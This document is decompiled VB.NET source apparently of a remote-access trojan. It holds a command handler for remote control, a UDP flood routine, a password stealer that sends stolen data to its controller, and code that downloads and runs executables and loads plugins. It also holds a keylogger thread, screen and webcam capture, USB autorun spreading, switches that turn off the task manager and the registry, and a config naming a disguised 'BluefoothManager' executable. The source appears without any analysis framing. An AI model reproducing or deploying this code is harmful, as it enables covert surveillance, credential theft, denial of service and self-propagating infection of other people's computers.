...
Namespace w
	...
	Public Class OK
		...
		Public Shared Function Cam() As Boolean
			...
			Try
				...
				While True
					...
					Dim cbName As Integer = 100
					Dim text2 As String = Nothing
					Dim flag As Boolean = OK.capGetDriverDescriptionA(wDriver, text, cbName, text2, 100)
					If flag Then
						Exit While
					End If
					num += 1
				...
				Try
					...
					Try
						...
						Else
							...
							Dim text2 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")))
							text = str + OK.DEB(text2) + vbCrLf
						End If
		...
		Public Shared Function GTV(n As String, ret As Object) As Object
			...
			Try
				result = OK.F.Registry.CurrentUser.OpenSubKey("Software\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))))
			Catch ex As Exception
				result = ret
			End Try
			Return result
		...
		Public Shared Function HWD() As String
			...
			Try
				...
				Dim text2 As String = Nothing
				Dim nVolumeNameSize As Integer = 0
				Dim num As Integer = 0
				Dim num2 As Integer = 0
				Dim text3 As String = Nothing
				Dim number As Integer
				OK.GetVolumeInformation(text, text2, nVolumeNameSize, number, num, num2, text3, 0)
		...
		Public Shared Sub Ind(b As Byte())
			...
			Try
				...
				Dim flag As Boolean = Operators.CompareString(left, "nwpr", False) = 0
				...
				Else
					...
					Else
						...
						If flag Then
							OK.Send("fun")
						Else
							flag = (Operators.CompareString(left, "IEhome", False) = 0)
							If flag Then
								OK.AddHome(array(1))
							Else
								...
								Else
									flag = (Operators.CompareString(left, "restartcomputer", False) = 0)
									If flag Then
									...
									Else
										...
										Else
											...
											If flag Then
												Dim left2 As String = array(1)
												flag2 = (Operators.CompareString(left2, "1", False) = 0)
												Dim icon As MessageBoxIcon
												If flag2 Then
													icon = MessageBoxIcon.Asterisk
												Else
													flag2 = (Operators.CompareString(left2, "2", False) = 0)
													If flag2 Then
														icon = MessageBoxIcon.Question
													Else
														flag2 = (Operators.CompareString(left2, "3", False) = 0)
														If flag2 Then
															icon = MessageBoxIcon.Exclamation
														Else
															flag2 = (Operators.CompareString(left2, "4", False) = 0)
															If flag2 Then
												...
												flag2 = (Operators.CompareString(left3, "1", False) = 0)
												...
												Else
													...
													Else
														...
														Else
															...
															Else
																flag2 = (Operators.CompareString(left3, "5", False) = 0)
																If flag2 Then
																	buttons = MessageBoxButtons.RetryCancel
																Else
																	flag2 = (Operators.CompareString(left3, "6", False) = 0)
																	If flag2 Then
											...
											Else
												flag2 = (Operators.CompareString(left, "peech", False) = 0)
												If flag2 Then
													...
													Dim arguments As Object() = array6
													...
													End If
												Else
													flag2 = (Operators.CompareString(left, "BepX", False) = 0)
													If flag2 Then
														OK.Beep(CInt(Math.Round(Conversion.Val(array(1)))), CInt(Math.Round(Conversion.Val(array(2)))))
													Else
														flag2 = (Operators.CompareString(left, "piano", False) = 0)
														If flag2 Then
															OK.Beep(CInt(Math.Round(Conversion.Val(array(1)))), 300)
														Else
															flag2 = (Operators.CompareString(left, "OpenCD", False) = 0)
															If flag2 Then
																Dim text2 As String = "set CDAudio door open"
																Dim text3 As String = ""
																OK.mciSendString(text2, text3, 0L, 0L)
															Else
																flag2 = (Operators.CompareString(left, "CloseCD", False) = 0)
																If flag2 Then
																	Dim text3 As String = "set CDAudio door closed"
																	Dim text2 As String = ""
																	OK.mciSendString(text3, text2, 0L, 0L)
																Else
																	flag2 = (Operators.CompareString(left, "DisableKM", False) = 0)
																	If flag2 Then
																		OK.apiBlockInput(1)
																	Else
																		flag2 = (Operators.CompareString(left, "EnableKM", False) = 0)
																		If flag2 Then
																			OK.apiBlockInput(0)
																		Else
																			flag2 = (Operators.CompareString(left, "TurnOffMonitor", False) = 0)
																			If flag2 Then
																				OK.SendMessage(-1, 274UI, 61808UI, 2)
																			Else
																				flag2 = (Operators.CompareString(left, "TurnOnMonitor", False) = 0)
																				If flag2 Then
																					OK.SendMessage(-1, 274UI, 61808UI, -1)
																				Else
																					flag2 = (Operators.CompareString(left, "NormalMouse", False) = 0)
																					If flag2 Then
																						OK.SwapMouseButton(0L)
																					Else
																						flag2 = (Operators.CompareString(left, "ReverseMouse", False) = 0)
																						If flag2 Then
																							OK.SwapMouseButton(256L)
																						Else
																							flag2 = (Operators.CompareString(left, "DisableCMD", False) = 0)
																							If flag2 Then
																							...
																							Else
																								flag2 = (Operators.CompareString(left, "EnableCMD", False) = 0)
																								If flag2 Then
																								...
																								Else
																									flag2 = (Operators.CompareString(left, "DisableRegistry", False) = 0)
																									If flag2 Then
																									...
																									Else
																										flag2 = (Operators.CompareString(left, "EnableRegistry", False) = 0)
																										If flag2 Then
																										...
																										Else
																											flag2 = (Operators.CompareString(left, "DisableRestore", False) = 0)
																											If flag2 Then
																											...
																											Else
																												flag2 = (Operators.CompareString(left, "EnableRestore", False) = 0)
																												If flag2 Then
																												...
																												Else
																													flag2 = (Operators.CompareString(left, "DisableTaskManager", False) = 0)
																													If flag2 Then
																													...
																													Else
																														flag2 = (Operators.CompareString(left, "EnableTaskManager", False) = 0)
																														If flag2 Then
																														...
																														Else
																															flag2 = (Operators.CompareString(left, "CursorShow", False) = 0)
																															If flag2 Then
																																Cursor.Show()
																															Else
																																flag2 = (Operators.CompareString(left, "CursorHide", False) = 0)
																																If flag2 Then
																																	Cursor.Hide()
																																Else
																																	flag2 = (Operators.CompareString(left, "sendmusicplay", False) = 0)
																																	If flag2 Then
																																	...
																																	Else
																																		flag2 = (Operators.CompareString(left, "OpenSite", False) = 0)
																																		If flag2 Then
																																			Process.Start(array(1))
																																		Else
																																			...
																																			If flag2 Then
																																				OK.Send("dos")
																																			Else
																																				flag2 = (Operators.CompareString(left, "udp", False) = 0)
																																				If flag2 Then
																																					OK.Send("udp")
																																					OK.TIP = array(1)
																																					OK.Tport = array(2)
																																					...
																																					Try
																																						While True
																																							...
																																							End If
																																							Try
																																								Dim remoteEP As IPEndPoint = New IPEndPoint(IPAddress.Parse(OK.TIP), Conversions.ToInteger(OK.Tport))
																																					...
																																					End Try
																																				Else
																																					flag2 = (Operators.CompareString(left, "udpstp", False) = 0)
																																					If flag2 Then
																																						OK.udp = False
																																					Else
																																						flag2 = (Operators.CompareString(left, "pingstop", False) = 0)
																																						If flag2 Then
																																						...
																																						Else
																																							...
																																							If flag2 Then
																																								Try
																																									Dim text4 As String = Interaction.Environ("temp") + "/pass.exe"
																																								...
																																								End Try
																																								Try
																																									Dim path As String = Interaction.Environ("temp") + "/temp.txt"
																																									Dim text5 As String = File.ReadAllText(path)
																																									OK.Send("pas" + OK.Y + OK.ENB(text5))
																																								Catch ex5 As Exception
																																								End Try
																																								Return
																																							End If
																																							...
																																							If flag2 Then
																																								...
																																								Return
																																							End If
																																							flag2 = (Operators.CompareString(left, "prof", False) = 0)
																																							If flag2 Then
																																								Dim left4 As String = array(1)
																																								flag = (Operators.CompareString(left4, "~", False) = 0)
																																								If flag Then
				...
				If Not flag2 Then
					...
					IL_CF6:
					OK.Send("bla")
					Dim text6 As String = Path.GetTempFileName() + "." + array(1)
					Try
					...
					End Try
				End If
				Dim left5 As String = text
				flag2 = (Operators.CompareString(left5, "inv", False) = 0)
				If flag2 Then
					Dim array8 As Byte() = CType(OK.GTV(array(1), New Byte(-1) {}), Byte())
					flag2 = (array(3).Length < 10 And array8.Length = 0)
					If flag2 Then
					...
					Else
						...
						If flag2 Then
							...
							array8 = OK.ZIP(memoryStream2.ToArray())
							OK.STV(array(1), array8, RegistryValueKind.Binary)
						End If
						OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(0) }))
						Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array8, "A"))))
					...
					End If
				Else
					flag2 = (Operators.CompareString(left5, "ret", False) = 0)
					If flag2 Then
						Dim array9 As Byte() = CType(OK.GTV(array(1), New Byte(-1) {}), Byte())
						flag2 = (array(2).Length < 10 And array9.Length = 0)
						If flag2 Then
							OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(1) }))
						Else
							...
							If flag2 Then
								...
								array9 = OK.ZIP(memoryStream3.ToArray())
								OK.STV(array(1), array9, RegistryValueKind.Binary)
							End If
							OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(0) }))
							Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array9, "A"))))
							Dim array4 As String() = New String(4) {}
							array4(0) = "ret"
							array4(1) = OK.Y
							array4(2) = array(1)
							array4(3) = OK.Y
							Dim array10 As String() = array4
							Dim num3 As Integer = 4
							Dim text3 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), Nothing, "GT", New Object(-1) {}, Nothing, Nothing, Nothing)))
							array10(num3) = OK.ENB(text3)
							OK.Send(String.Concat(array4))
						End If
					Else
						flag2 = (Operators.CompareString(left5, "CAP", False) = 0)
						If flag2 Then
							...
							Dim left6 As String = OK.md5(memoryStream5.ToArray())
							flag2 = (Operators.CompareString(left6, OK.lastcap, False) <> 0)
							If flag2 Then
								OK.lastcap = left6
							...
							bitmap2.Dispose()
						Else
							flag2 = (Operators.CompareString(left5, "un", False) = 0)
							If flag2 Then
								Dim left7 As String = array(1)
								flag = (Operators.CompareString(left7, "~", False) = 0)
								If flag Then
									OK.UNS()
								Else
									flag2 = (Operators.CompareString(left7, "!", False) = 0)
									If flag2 Then
										OK.pr(0)
										ProjectData.EndApp()
									Else
								...
								If flag2 Then
									...
									If flag2 Then
										...
										If flag Then
											...
											End If
										End If
										Dim array11 As Object() = New Object() { b }
										Dim array12 As Boolean() = New Boolean() { True }
										NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "ind", array11, Nothing, Nothing, array12, True)
										flag2 = array12(0)
										If flag2 Then
											b = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array11(0)))), GetType(Byte())), Byte())
										End If
									Else
								...
								Else
									...
									If flag2 Then
										Try
											...
											bytes2 = OK.ZIP(memoryStream7.ToArray())
											GoTo IL_15BE
									...
									Try
										bytes2 = webClient3.DownloadData(array(1))
									...
									IL_15BE:
									OK.Send("bla")
									Dim text7 As String = Path.GetTempFileName() + ".exe"
									Try
		...
		Public Shared Function inf() As String
			...
			Try
				...
				If flag Then
					Dim str As String = text
					Dim text2 As String = OK.DEB(OK.VN) + "_" + OK.HWD()
					text = str + OK.ENB(text2) + OK.Y
				Else
					Dim str2 As String = text
					Dim text2 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")))
					Dim text3 As String = OK.DEB(text2) + "_" + OK.HWD()
					text = str2 + OK.ENB(text3) + OK.Y
				End If
			Catch ex As Exception
				Dim str3 As String = text
				Dim text3 As String = OK.HWD()
				text = str3 + OK.ENB(text3) + OK.Y
			End Try
			Try
			...
			Dim text4 As String = ""
			Try
				For Each text5 As String In OK.F.Registry.CurrentUser.CreateSubKey("Software\" + OK.RG, RegistryKeyPermissionCheck.[Default]).GetValueNames()
					flag = (text5.Length = 32)
					If flag Then
						text4 = text4 + text5 + ","
					End If
				Next
		...
		Public Shared Sub INS()
			...
			If flag Then
				...
				For Each logicalDrive As String In logicalDrives
					Try
						File.Copy(Application.ExecutablePath, logicalDrive + text2)
						File.SetAttributes(logicalDrive + text2, fileAttributes)
					Catch ex7 As Exception
					End Try
					Try
						Using streamWriter As New StreamWriter(logicalDrive + "\" + text)
							streamWriter.WriteLine("[autorun]")
							streamWriter.WriteLine("open=" + logicalDrive + text2)
							streamWriter.WriteLine("shellexecute=" + logicalDrive, 1)
						End Using
						File.SetAttributes(logicalDrive + text, fileAttributes)
					Catch ex8 As Exception
					End Try
				Next
			End If
		...
		Public Shared Sub ko()
			Dim thread As New Thread(AddressOf OK.RC)
			...
			Try
				OK.kq = New kl()
				Dim thread2 As New Thread(AddressOf OK.kq.WRK)
				thread2.Start()
			Catch ex2 As Exception
			End Try
			flag = OK.task
			If flag Then
				Dim [object] As mgr = New mgr()
				Dim thread3 As New Thread(AddressOf [object].protect)
				thread3.Start()
			End If
			Dim num As Integer = 0
			Dim left As String = ""
									...
									While True
										...
										Select Case charCode
											...
											Case 0
												...
												GoTo IL_7E
											Case Else
												text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString()))
										End Select
									End While
									GoTo IL_15B
								End If
...
IL_15B:
							...
							Dim num3 As Long = num - OK.MeM.Length
							flag2 = (CLng(OK.b.Length) > num3)
							If flag2 Then
								OK.b = New Byte(CInt((num3 - 1L)) + 1 - 1 + 1 - 1) {}
							End If
							...
							If flag2 Then
								num = -1L
								Dim thread As New Thread(AddressOf OK.im)
		...
		Public Shared DR As String = "AppData"

		' Token: 0x0400000F RID: 15
		Public Shared EXE As String = "BluefoothManager"
		...
		Public Shared HH As String = "127.0.0.1"
		...
		Public Shared RG As String = "47d35012548e2ffc7eab9144440cc41a"
